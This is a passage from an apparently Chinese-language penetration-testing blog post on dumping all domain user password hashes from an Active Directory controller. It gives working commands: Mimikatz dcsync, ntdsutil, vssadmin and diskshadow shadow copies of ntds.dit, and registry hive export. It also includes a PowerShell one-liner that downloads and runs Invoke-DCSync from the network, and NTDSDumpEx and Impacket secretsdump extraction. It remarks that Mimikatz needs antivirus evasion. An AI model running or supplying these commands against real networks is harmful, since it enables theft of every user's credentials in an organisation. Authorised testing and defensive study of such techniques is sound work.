(Win32_Process)-&gt;Create()</span><br><span class="line"></span><br><span class="line">Method execution successful.</span><br><span class="line"></span><br><span class="line">Out Parameters:</span><br><span class="line">instance of __PARAMETERS</span><br><span class="line">&#123;</span><br><span class="line">ProcessId = 7372;</span><br><span class="line">ReturnValue = 0;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="导出域用户Hash方法总结"><a href="#导出域用户Hash方法总结" class="headerlink" title="导出域用户Hash方法总结"></a>导出域用户Hash方法总结</h3><p>在拥有域管权限时，可以提取所有域用户的密码Hash，为下一步渗透做准备。</p><p>Hash 值存储在域控制器中（C:\Windows\NTDS\NTDS.DIT）<br><code>NTDS.DIT</code> 文件经常被操作系统使用，无法直接复制到其它位置。可尝试以下方法 Dump Hash。</p><h4 id="1-Mimikatz"><a href="#1-Mimikatz" class="headerlink" title="1.Mimikatz"></a>1.Mimikatz</h4><p>Mimikatz有一个功能（dcsync），它利用目录复制服务（DRS）从 NTDS.DIT 文件中检索密码 Hash 值。</p><p>需要权限：域管权限<br>Mimikatz 需免杀</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 所有用户</span></span><br><span class="line">Mimikatz <span class="string">&quot;lsadump::dcsync /domain:test.com /all /csv&quot;</span> <span class="built_in">exit</span> &gt; hash.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定用户</span></span><br><span class="line">Mimikatz <span class="string">&quot;lsadump::dcsync /domain:test.com /user:username&quot;</span> <span class="built_in">exit</span> &gt; hash.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-Ntdsutil"><a href="#2-Ntdsutil" class="headerlink" title="2.Ntdsutil"></a>2.Ntdsutil</h4><p>Ntdsutil 域控制器默认安装，使管理员能访问和管理 Windows Active Directory 数据库。渗透测试中可以用它来拍摄 ntds.dit 文件的快照</p><p>需要权限：域管权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;activate instance ntds&quot;</span> create quit quit</span><br><span class="line">GUID 为 &#123;aa488f5b-40c7-4044-b24f-16fd041a6de2&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;mount GUID&quot;</span> quit quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制 ntds.dit</span></span><br><span class="line">copy C:\$SNAP_201908200435_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;unmount GUID&quot;</span> quit quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;delete GUID&quot;</span> quit quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;List All&quot;</span> quit quit</span><br><span class="line">ntdsutil snapshot <span class="string">&quot;List Mounted&quot;</span> quit quit</span><br></pre></td></tr></table></figure><h4 id="3-Vssadmin"><a href="#3-Vssadmin" class="headerlink" title="3.Vssadmin"></a>3.Vssadmin</h4><p>域控制器默认安装</p><p>需要权限：域管权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询当前系统的快照</span></span><br><span class="line">vssadmin list shadows</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建快照</span></span><br><span class="line">vssadmin create shadow /<span class="keyword">for</span>=c: /autoretry=10</span><br><span class="line"><span class="string">&quot;Shadow Copy Volume Name&quot;</span> 为 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</span><br><span class="line"><span class="string">&quot;Shadow Copy ID&quot;</span> 为 &#123;aa488f5b-40c7-4044-b24f-16fd041a6de2&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制 ntds.dit</span></span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除快照</span></span><br><span class="line">vssadmin delete shadows /<span class="keyword">for</span>=c: /quiet</span><br></pre></td></tr></table></figure><h4 id="4-Diskshadow"><a href="#4-Diskshadow" class="headerlink" title="4.Diskshadow"></a>4.Diskshadow</h4><p><code>DiskShadow</code> 是由微软官方签名的，Windows Server 2008、2012、2016 都包含了 DiskShadow，所在目录<code>C:\windows\system32\diskshadow.exe</code>。包含<code>交互式命令</code>和<code>脚本模式</code>。</p><p>下面利用脚本模式提取AD数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看存放 `ntds.dit` 的逻辑驱动器（一般为 C 盘）</span></span><br><span class="line"><span class="comment"># 找出系统没有使用的逻辑驱动器号</span></span><br><span class="line">wmic logicaldisk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用脚本</span></span><br><span class="line">C:\windows\system32\diskshadow.exe /s C:\shadow.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>shadow.txt 内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> context persistent nowriters</span><br><span class="line">add volume c: <span class="built_in">alias</span> someAlias</span><br><span class="line">create</span><br><span class="line">expose %someAlias% z:</span><br><span class="line"><span class="built_in">exec</span> <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span> /c copy z:\windows\ntds\ntds.dit c:\ntds.dit</span><br><span class="line">delete shadows volume %someAlias%</span><br><span class="line">reset</span><br></pre></td></tr></table></figure><h4 id="5-Powershell"><a href="#5-Powershell" class="headerlink" title="5.Powershell"></a>5.Powershell</h4><p>项目地址：<a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 远程加载 Invoke-DCSync.ps1</span></span><br><span class="line">powershell -<span class="built_in">exec</span> bypass -<span class="built_in">command</span> <span class="string">&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-DCSync.ps1&#x27;)&quot;</span>;Invoke-DCSync -PWDumpFormat &gt; hash.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="如何从ntds-dit提取Hash"><a href="#如何从ntds-dit提取Hash" class="headerlink" title="如何从ntds.dit提取Hash"></a>如何从ntds.dit提取Hash</h3><h4 id="1-NTDSDumpEx"><a href="#1-NTDSDumpEx" class="headerlink" title="1.NTDSDumpEx"></a>1.NTDSDumpEx</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">usage: ntdsdumpex.exe &lt;-d ntds.dit&gt; &lt;-k HEX-SYS-KEY | -s system.hiv |-r&gt; [-o out.txt] [-h] [-m] [-p] [-u]</span><br><span class="line">-d    path of ntds.dit database</span><br><span class="line">-k    use specified SYSKEY</span><br><span class="line">-s    parse SYSKEY from specified system.hiv</span><br><span class="line">-r    <span class="built_in">read</span> SYSKEY from registry</span><br><span class="line">-o    write output into</span><br><span class="line">-h    dump <span class="built_in">hash</span> histories(<span class="keyword">if</span> available)</span><br><span class="line">-p    dump description and path of home directory</span><br><span class="line">-m    dump machine accounts</span><br><span class="line">-u    USE UPPER-CASE-HEX</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 离线模式：先导出注册表</span></span><br><span class="line">reg save hklm\system system.hiv</span><br><span class="line">NTDSDumpEx.exe -d ntds.dit -s system.hiv -o hash.txt</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在线模式：无需导出注册表</span></span><br><span class="line">NTDSDumpEx.exe -d ntds.dit -r -o hash.txt</span><br></pre></td></tr></table></figure><h4 id="2-Impacket"><a href="#2-Impacket" class="headerlink" title="2.Impacket"></a>2.Impacket</h4><p>项目地址：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/SecureAuthCorp/impacket</span><br><span class="line"><span class="comment"># 安装所需库 </span></span><br><span class="line">pip install .</span><br><span class="line">python setup.py</span><br><span class="line"><span class="comment"># 使用 secretsdump.py 解 Hash</span></span><br><span class="line">/impacket/examples<span class="comment"># python secretsdump.py -ntds /home/workspace/hash/ntds.dit -system /home/workspace/hash/sys.hiv LOCAL &gt; /home/workspace/hash/hash.txt</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>Mimikatz 在域用户机器执行需要域管权限时，可使用 <code>psexec</code>、<code>计划任务</code>等远程执行</li><li>使用 <code>Ntdsutil</code>、<code>Vssadmin</code> 等卷影拷贝工具时，需要先开启 <code>Volume Shadow Copy Service</code> 服务</li><li>有时遇到 <code>NTDSDumpEx</code> 提取出错，可以尝试修复 ntds.dit，修复后还无法提取，则使用 <code>secretsdump.py</code>。缺点：比较耗时</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-hash-with-mimikatz/">https://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-hash-with-mimikatz/</a></p><p><a href="https://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-cc/">https://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-cc/</a></p><p><a href="https://scarletf.github.io/2019/09/03/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%AF%BC%E5%87%BA%E5%9F%9F%E7%94%A8%E6%88%B7Hash%E6%96%B9%E6%B3%95/">https://scarletf.github.io/2019/09/03/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%AF%BC%E5%87%BA%E5%9F%9F%E7%94%A8%E6%88%B7Hash%E6%96%B9%E6%B3%95/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
